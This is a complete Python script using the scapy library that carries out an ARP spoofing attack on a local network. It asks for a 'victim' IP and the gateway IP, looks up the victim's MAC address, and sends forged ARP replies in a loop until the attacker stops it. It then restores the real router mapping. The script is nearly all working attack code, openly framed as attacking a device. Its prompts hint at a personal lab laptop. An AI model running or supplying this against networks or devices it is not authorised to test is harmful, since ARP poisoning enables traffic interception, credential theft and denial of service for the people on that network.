from scapy.all import ARP, Ether, srp, sendp
import time


def get_victim_mac():
    global victim_ip
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=victim_ip)
    answered, unanswered = srp(request, timeout=3, retry=3, verbose=False)
    if not answered:
        raise SystemExit(f"Could not find {victim_ip}. Is the laptop awake and on the same Wi-Fi?")
    victim_mac = answered[0][1].hwsrc
    return victim_mac


def spoof(victim_mac):
    global victim_ip
    packet = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip)
    sendp(packet, verbose=False)


def restore(victim_mac):
    global victim_ip, router_ip
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=router_ip)
    answered, unanswered = srp(request, timeout=3, retry=3, verbose=False)
    router_mac = answered[0][1].hwsrc
    packet = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac)
    sendp(packet, count=5, verbose=False)


print("you can view the answers to the following quetions by running the comand ipconfig in the victim's terminal")
victim_ip = input("Enter the IP address of the device you want to attack: ")
router_ip = input("Enter the default gateway IP address of the network (usually your router's IP): ")


victim_mac = get_victim_mac()
try:
    while True:
        spoof(victim_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nStopping attack, restoring laptop's connection...")
    restore(victim_mac)
    print("Done. Laptop reconnected and should work well now.")
